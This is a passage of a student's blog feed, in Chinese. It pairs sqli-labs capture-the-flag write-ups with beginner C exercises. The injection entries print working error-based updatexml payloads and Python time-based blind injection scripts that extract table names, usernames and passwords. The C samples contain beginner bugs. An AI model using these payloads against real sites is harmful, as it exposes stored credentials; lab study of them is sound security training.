    <id>http://example.com/2022/02/23/17/</id>
    <published>2022-02-23T08:53:32.000Z</published>
    <updated>2022-02-23T10:02:45.285Z</updated>
    
    <content type="html"><![CDATA[<p>有题目可推断此题是在账户登入后更改密码界面为背景由上方标题可知账户名称<br><img src="https://s2.loli.net/2022/02/23/eGUtRxDig7cL2VC.png" alt="1"><br><img src="https://s2.loli.net/2022/02/23/TSgGxZFXaH9yQRc.png" alt="2"><br>由其源码可知对于密码没有处理，我们即对密码进行爆破<br>爆破的方式可使用updatexml()函数进行，通过测试可知此题数据有’所包裹。之后在密码行进行爆破。<br>    1’ and updatexml(1,concat(0x7e,database(),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/qcDh4IAZtw9a81g.png" alt="3"><br>    1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/uErGCgBHSMD8UPs.png" alt="4"><br>    1’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,31),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/7DibyR4HFvPsBZz.png" alt="5"><br>    1’ and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from security.users),1,31),0x7e),1)– +<br>此时回显出现错误<br><img src="https://s2.loli.net/2022/02/23/aB1mIi7epT3WM6O.png" alt="6"><br>不能在FROM子句中为update指定目标表“users”<br>不能先select表中的某些值，再update这个表（在同一语句中）。<br>解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误。<br>注意：此问题只出现于MySQL，msSQL和Oracle不会出现此问题。<br>正确代码如下：<br>    1’ and updatexml (1,concat(0x7e,substr((select*from(select group_concat(id,’<del>‘,username,’</del>‘,password)from security.users)a),1,31),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/1s6MrgAhQjoCHZf.png" alt="7"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有题目可推断此题是在账户登入后更改密码界面为背景由上方标题可知账户名称&lt;br&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/23/eGUtRxDig7cL2VC.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://s2.lol</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>13</title>
    <link href="http://example.com/2022/02/21/13/"/>
    <id>http://example.com/2022/02/21/13/</id>
    <published>2022-02-21T14:46:32.779Z</published>
    <updated>2022-02-23T12:38:20.955Z</updated>
    
    <content type="html"><![CDATA[<p>运用1’  1进行输入可知此题数据有’)所覆盖，再使用1’) or ‘1’=1– +进行试登发现没有回显<br>这里是会输出数据库报错的。所以是可以进行报错注入。</p><p>而且这里一个红色图片和一个蓝色图片，典型的可以进行布尔盲注。</p><p>这里使一下报错注入：（但是只能有32位回显，需要分次进行破解，除此之外可用之前burb进行破解）<br><img src="https://s2.loli.net/2022/02/22/37RdWoOIxwsVq5F.png" alt="1"><br>    1’) union select 1,updatexml(1,concat(0x7e,database(),0x7e),1)#<br><img src="https://s2.loli.net/2022/02/22/i1lVImx5F3WQRj4.png" alt="2"><br>    1’) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)#</p><p><img src="https://s2.loli.net/2022/02/22/vgEeZIVH5li1aD8.png" alt="3"><br>    uname=1’) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,31),0x7e),1)#</p><pre><code>uname=1&#39;) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),32,63)0x7e),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/22/pqiVHOU9PmLgY5S.png" alt="4"><br>uname=1’) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(id,password,username) from users),1,31),0x7e),1)#<br><img src="https://s2.loli.net/2022/02/22/vi7ArIHm8kyDFV6.png" alt="5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;运用1’  1进行输入可知此题数据有’)所覆盖，再使用1’) or ‘1’=1– +进行试登发现没有回显&lt;br&gt;这里是会输出数据库报错的。所以是可以进行报错注入。&lt;/p&gt;
&lt;p&gt;而且这里一个红色图片和一个蓝色图片，典型的可以进行布尔盲注。&lt;/p&gt;
&lt;p&gt;这里使一下报错注入：</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less9 and less 10</title>
    <link href="http://example.com/2021/11/28/less9%20less10/"/>
    <id>http://example.com/2021/11/28/less9%20less10/</id>
    <published>2021-11-27T16:00:00.000Z</published>
    <updated>2021-11-28T02:37:21.163Z</updated>
    
    <content type="html"><![CDATA[<p>less9与less10相似，区别在于在使用延迟语句确认是否存在注入时，less9使用’时存在闭合，less10使用”时存在闭合。<br><img src="https://i.loli.net/2021/11/28/O6Gy3sjTAVtvl8B.png" alt="图片1.png"><br><img src="https://i.loli.net/2021/11/28/GUo4piLg73nW5PJ.png" alt="图片2.png"><br>知道存在注入后，由于此题在语法错误时仍然有you are in回显，<br>所以使用python进行时间盲注<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    name = ‘’<br>    for i in range(1, 9):<br>        for j in dic:<br>            payload = “ and if(substr(database(),%s,1)=’%s’,sleep(4),1)–+” %(i, j)<br>            url1 = url + payload<br>            print(url1)<br>            time1 = datetime.datetime.now()<br>            r = requests.get(url=url1)<br>            time2 = datetime.datetime.now()<br>            time3 = (time2 - time1).total_seconds()   //计算出在得出结果后经历的时间，大于4则if的条件为真则可以得到库名<br>            if time3 &gt;= 4:<br>                name += j<br>                print(name)<br>                break<br>    n = name<br>    print(‘数据库名字为:’ + n)<br>之后在运用for循环查出表名<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag1=””<br>    flag2=””<br>    flag3=””</p><pre><code>flag4=&quot;&quot;for a in range(5):    for i in range(1, 9):        for j in dic:            payload = &quot; and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=&#39;%s&#39;),3,0)) --+&quot; % (            a, i, j)            url1 = url + payload            print(url1)            time1 = datetime.datetime.now()            r = requests.get(url=url1)            time2 = datetime.datetime.now()            time3 = (time2 - time1).total_seconds()            if time3&gt;=3:                if a==0:                    flag1+=j                    print(flag1)                elif a==1:                    flag2+=j                    print(flag2)                elif a==2:                    flag3+=j                    print(flag3)                elif a==3:                    flag4+=j                    print(flag4)                else:                    breakprint(&#39;数据库名字为:&#39; + flag1)print(&#39;数据库名字为:&#39; + flag2)print(&#39;数据库名字为:&#39; + flag3)print(&#39;数据库名字为:&#39; + flag4)</code></pre><p>之后查列名及字段只需改变<br>     payload = “ and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>列名：<br>     payload = “ and sleep(if((substr((select column_name from information_schema.columns where table_name=’users’ limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>字段：<br>     payload = “ and sleep(if((substr((select password from security.users limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>less10只需将1’改为1”即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;less9与less10相似，区别在于在使用延迟语句确认是否存在注入时，less9使用’时存在闭合，less10使用”时存在闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/28/O6Gy3sjTAVtvl8B.png&quot; alt=&quot;图片</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>利用phpstudy里的MySQL并通过命令行</title>
    <link href="http://example.com/2021/11/06/%E5%88%A9%E7%94%A8phpstudy%E8%BF%9B%E8%A1%8Cmysql/"/>
    <id>http://example.com/2021/11/06/%E5%88%A9%E7%94%A8phpstudy%E8%BF%9B%E8%A1%8Cmysql/</id>
    <published>2021-11-05T16:00:00.000Z</published>
    <updated>2021-11-06T03:39:04.113Z</updated>
    
    <content type="html"><![CDATA[<p>打开phpstudy<br><img src="https://i.loli.net/2021/11/06/P2cLuyxH5dnY1ls.png" alt="1"><br>打开文件位置后将下列地址在环境变量中添加到系统变量Path中<br><img src="https://i.loli.net/2021/11/06/QFHrj19Dh4sxPBM.png" alt="2"><br>此时打开cmd检验依旧会拒绝访问<br><img src="https://i.loli.net/2021/11/06/TgVFG8tRfouJrUz.png" alt="3"><br>进入phpstudy中修改root密码<br><img src="https://i.loli.net/2021/11/06/8uEXtQLHPbzy79m.png" alt="4"><br>然后在cmd下输入 mysql -uroot -p，回车，提示输入密码，输入刚刚设置的密码，成功进入<br><img src="https://i.loli.net/2021/11/06/GyLYs1W7FNXlT5I.png" alt="5"><br>此时输入show databases就能显示mysql中的表<br><img src="https://i.loli.net/2021/11/06/VksnATLF9rClouZ.png" alt="6"><br>使用security的表，并展示表格<br><img src="https://i.loli.net/2021/11/06/TLrZ2FgG6VQk5oa.png" alt="7"><br>再次输入select * from users<br><img src="https://i.loli.net/2021/11/06/Km3x56TnfjSeJPE.png" alt="8"><br>Mysql简单用法：<br>查库：select schema_name from information_schema.schemata,查找所有的库<br><img src="https://i.loli.net/2021/11/06/vUpYBIsTuAF5lGX.png" alt="9"><br>查表:select table_name from information_schema.tables where table_schema=’security’<br><img src="https://i.loli.net/2021/11/06/veLp57ESxVbhkMz.png" alt="10"><br>查列：select column_name from information_schema.columns where table_name=’users’<br><img src="https://i.loli.net/2021/11/06/eXdzCniPZDK76Vk.png" alt="11"><br>查字段：select username,password from security.users<br><img src="https://i.loli.net/2021/11/06/BWIFV8bTyurRaJX.png" alt="12"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开phpstudy&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/06/P2cLuyxH5dnY1ls.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;打开文件位置后将下列地址在环境变量中添加到系统变量Path中&lt;br&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C语言实现三子棋</title>
    <link href="http://example.com/2021/10/31/%E4%B8%89%E5%AD%90%E6%A3%8B/"/>
    <id>http://example.com/2021/10/31/%E4%B8%89%E5%AD%90%E6%A3%8B/</id>
    <published>2021-10-30T16:00:00.000Z</published>
    <updated>2021-11-05T03:08:54.448Z</updated>
    
    <content type="html"><![CDATA[<p>#函数定义<br>    #include”game.h”</p><pre><code>void InitBoard(char board[ROW][COL], int row, int col)//初始化棋盘&#123;int i = 0;int j = 0;for (i = 0;i &lt; row;i++) &#123;    for (j = 0;j &lt; col;j++)        board[i][j] = &#39; &#39;;//使初始化时都为空格&#125;&#125;void Display(char board[ROW][COL], int row, int col)&#123;int i = 0;for (i = 0;i &lt; row;i++)&#123;       //打印一行数据int j = 0;    for (j = 0;j &lt; col;j++) &#123;        printf(&quot; %c &quot;, board[i][j]);        if (j &lt; col - 1)            printf(&quot;|&quot;);        &#125;     printf(&quot;\n&quot;);    //printf(&quot; %c | %c | %c \n&quot;,board[i][0],board[i][1],board[i][2]);    if (i &lt; row - 1)    &#123;        for (j = 0;j &lt; col;j++)        &#123;            printf(&quot;---&quot;);            if(j&lt;col-1)            printf(&quot;|&quot;);        &#125;        printf(&quot;\n&quot;);        &#125;    //printf(&quot;---|---|---\n&quot;);    //打印分割行&#125;&#125;void playermove(char board[ROW][COL], int row, int col)&#123;int x = 0;int y = 0;while (1) &#123;    printf(&quot;玩家走：\n请输入要下的坐标：&quot;);    scanf(&quot;%d%d&quot;, &amp;x, &amp;y)    if (x &gt;= 1 &amp;&amp; x &lt;= row &amp;&amp; y &gt;= 1 &amp;&amp; y &lt;= col) &#123;        if (board[x - 1][y - 1] == &#39; &#39;)        &#123;            board[x - 1][y - 1] = &#39;*&#39;;            break;&#125;        else &#123;            printf(&quot;该坐标被占用\n&quot;);        &#125;&#125;else            printf(&quot;非法坐标，请重新输入\n&quot;);&#125;&#125;void computer(char board[ROW][COL], int row, int col)&#123;printf(&quot;电脑走\n&quot;);//若输入与playermove一样的函数则为双人游戏int x = 0, y = 0;while (1) &#123;    x = rand() % row;    y = rand() % col;    if (board[x-1][y-1] == &#39; &#39;) &#123;        board[x-1][y-1] = &#39;#&#39;;        break;    &#125;&#125;&#125;int isfull(char board[ROW][COL],int row,int col) &#123;int i = 0;int j = 0;for (i = 0;i &lt; row;i++) &#123;    for (j = 0;j &lt;col;j++) &#123;        if (board[i][j] == &#39; &#39;)            return 0;//没满    &#125;&#125;return 1;//满棋盘&#125;char iswin(char board[ROW][COL], int row, int col)&#123;int i = 0;for (i = 0;i &lt; row;i++)&#123;    if (board[i][0] == board[i][1]&amp;&amp;board[i][1] == board[i][2] &amp;&amp; board[i][1] != &#39; &#39;) &#123;        return board[i][1];    &#125;    if (board[0][i] == board[1][i]&amp;&amp;board[1][i] == board[2][i] &amp;&amp; board[1][i] != &#39; &#39;) &#123;        return board[1][i];    &#125;&#125;if (board[0][0] == board[1][1]&amp;&amp;board[1][1] == board[2][2] &amp;&amp; board[1][1] != &#39; &#39;) &#123;    return board[1][1];&#125;    if (board[2][0] == board[1][1]&amp;&amp;board[1][1] == board[0][2] &amp;&amp; board[1][1] != &#39; &#39;) &#123;        return board[1][1];    &#125;    if (1 == isfull(board, ROW, COL)) &#123;        return &#39;Q&#39;;    &#125;    return &#39;c&#39;;&#125;</code></pre><p>#游戏初始化<br>    #include”game.h”<br>//测试三子棋<br>//    |   |<br>// —|—|—      第一行和第二行看作一组<br>//    |   |<br>// —|—|—      第三行和第四行看作一组<br>//    |   |         最后为一组</p><pre><code>void menu() &#123;printf(&quot;********************&quot;);printf(&quot;***1.play  0.exit***&quot;);printf(&quot;********************&quot;);&#125;void game()//游戏算法实现&#123;char ret = 0;// 数组--存放走出的棋盘信息 char board[ROW][COL] = &#123; 0 &#125;;//希望这数组中初始全部为空格,0也为不可打印字符//初始化棋盘--初始化数组InitBoard(board,ROW,COL);//传输ROW,COL使传输的数据能够把握每行每列Display(board,ROW,COL);//展示棋盘//下棋while (1)&#123;    //玩家下棋    playermove(board, ROW, COL);    Display(board, ROW, COL);    //判断玩家是否赢    ret=iswin(board,ROW,COL);    if (ret != &#39;c&#39;) &#123;        break;    &#125;    //电脑下棋    computer(board, ROW, COL);    Display(board, ROW, COL);    //判断电脑是否赢    iswin(board,ROW,COL);    if (ret != &#39;c&#39;) &#123;        break;    &#125;    //判断输赢&#125;if (ret == &#39;*&#39;)    printf(&quot;玩家赢\n&quot;);else if (ret == &#39;#&#39;)    printf(&quot;电脑赢\n&quot;);else    printf(&quot;平局\n&quot;);&#125;void test() &#123;srand((unsigned int)time(NULL));int input = 0;do &#123;    menu();    printf(&quot;请选择：&quot;);    scanf(&quot;%d&quot;, &amp;input);    switch (input) &#123;    case 1:        game();        break;    case 0:        printf(&quot;退出游戏\n&quot;);break;    default:        printf(&quot;请重新输入\n&quot;);break;    &#125;&#125; while (input);&#125;int main() &#123;test();return 0;&#125;</code></pre><p>#函数声明<br>    #pragma once</p><pre><code>#include&lt;stdio.h&gt;#include&lt;time.h&gt;#include&lt;stdlib.h&gt;#define ROW 3#define COL 3//改变棋盘大小只需改变此处数值void InitBoard(char board[ROW][COL], int row,int col);//row来接收ROW,col来接收COLvoid Display(char board[ROW][COL], int row, int col);void playermove(char board[ROW][COL], int row, int col);void computer(char board[ROW][COL], int row, int col);char iswin(char board[ROW][COL],int row,int col);//告诉四种状态1.玩家赢-‘*’2.电脑赢-’#‘3.平局-‘Q4’.继续游戏’c‘</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#函数定义&lt;br&gt;    #include”game.h”&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void InitBoard(char board[ROW][COL], int row, int col)//初始化棋盘
&amp;#123;
int i = 0;
int j = 0;
f</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>函数递归</title>
    <link href="http://example.com/2021/10/24/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/"/>
    <id>http://example.com/2021/10/24/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</id>
    <published>2021-10-23T16:00:00.000Z</published>
    <updated>2021-10-24T03:37:42.985Z</updated>
    
    <content type="html"><![CDATA[<p>#include&lt;stdio.h&gt;<br>    void print(int n)<br>{<br>    if (n&gt;9){<br>    print(n/10)<br>}<br>    printf(“%d”,n%10);<br>}<br>    int main()<br>{<br>    unsigned int num=0;<br>    scanf(“%d”,&amp;num);<br>    print(num);<br>    return 0;<br>}  </p><p>例：输入123；<br>进入递归后先执行if中语句：<br>1.第一次123/10=12大于9继而重新进入if循环进行12/10=1；继续进行打印”1%10=1”；<br>2.打印1后上一次结果12再次执行打印”12%10=2”；<br>3.最后123进行打印”123%10=3”.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#include&amp;lt;stdio.h&amp;gt;&lt;br&gt;    void print(int n)&lt;br&gt;{&lt;br&gt;    if (n&amp;gt;9){&lt;br&gt;    print(n/10)&lt;br&gt;}&lt;br&gt;    printf(“%d”,n%10);&lt;br&gt;}&lt;br&gt;    i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常用功能</title>
    <link href="http://example.com/2021/10/09/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2021/10/09/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/</id>
    <published>2021-10-08T16:00:00.000Z</published>
    <updated>2021-10-24T03:00:00.686Z</updated>
    
    <content type="html"><![CDATA[<ul><li><u>星空</u></li><li>![星空图片]<img src="https://i.loli.net/2021/10/24/zrBU2qbhL6lxK7P.jpg" alt="..jpg"></li><li><a href="https://www.bilibili.com/"><em>知识源泉</em></a></li><li><code>printf()</code>函数</li><li><pre><code class="javascript">$(document).ready(function () &#123;  alert(&#39;RUNOOB&#39;);&#125;);</code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;u&gt;星空&lt;/u&gt;&lt;/li&gt;
&lt;li&gt;![星空图片]&lt;img src=&quot;https://i.loli.net/2021/10/24/zrBU2qbhL6lxK7P.jpg&quot; alt=&quot;..jpg&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.b</summary>
      
    
    
    
    
    <category term="无借鉴意义" scheme="http://example.com/tags/%E6%97%A0%E5%80%9F%E9%89%B4%E6%84%8F%E4%B9%89/"/>
    
  </entry>
  
  <entry>
    <title>C语言新手代码</title>
    <link href="http://example.com/2021/09/26/C%E8%AF%AD%E8%A8%80%E6%96%B0%E6%89%8B%E4%BB%A3%E7%A0%81/"/>
    <id>http://example.com/2021/09/26/C%E8%AF%AD%E8%A8%80%E6%96%B0%E6%89%8B%E4%BB%A3%E7%A0%81/</id>
    <published>2021-09-25T16:00:00.000Z</published>
    <updated>2021-09-26T07:42:02.934Z</updated>
    
    <content type="html"><![CDATA[<p>#include &lt;stdio.h&gt;<br>int main()<br>{<br>     int n=1;           //输入n=1；m=2<br>     int m=2;<br>     switch(n)         //从n开始进行命令<br>{<br>     case1:    m++; //n=1，所以从case1开始进行m-&gt;3<br>     case2:    n++;  //case1后无break，所以case2继续进行n-&gt;2<br>     case3:<br>     switch(n)          //case3从n开始进行<br>{<br>     case1:    n++;   //n=2，所以case1不执行<br>     case2:    m++;n++;   //n=2case2执行，m-&gt;4,n-&gt;3<br>     break;               //break,出现代码块内结束<br>}<br>     case4:   m++;   //主函数内无break,所以case4进行<br>     break;<br>     default:             //default为默认<br>      break;<br>}<br>     printf(“m=%d,n=%d\n”,m,n);  //最后输出m，n的值<br>     return 0;<br>}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;int main()&lt;br&gt;{&lt;br&gt;     int n=1;           //输入n=1；m=2&lt;br&gt;     int m=2;&lt;br&gt;     switch(n)         //从n开始进行命令&lt;</summary>
      
    
    
    
    
    <category term="小白刚开始学习很多地方不懂，请多多指教" scheme="http://example.com/tags/%E5%B0%8F%E7%99%BD%E5%88%9A%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%BE%88%E5%A4%9A%E5%9C%B0%E6%96%B9%E4%B8%8D%E6%87%82%EF%BC%8C%E8%AF%B7%E5%A4%9A%E5%A4%9A%E6%8C%87%E6%95%99/"/>
    
  </entry>
  
</feed>
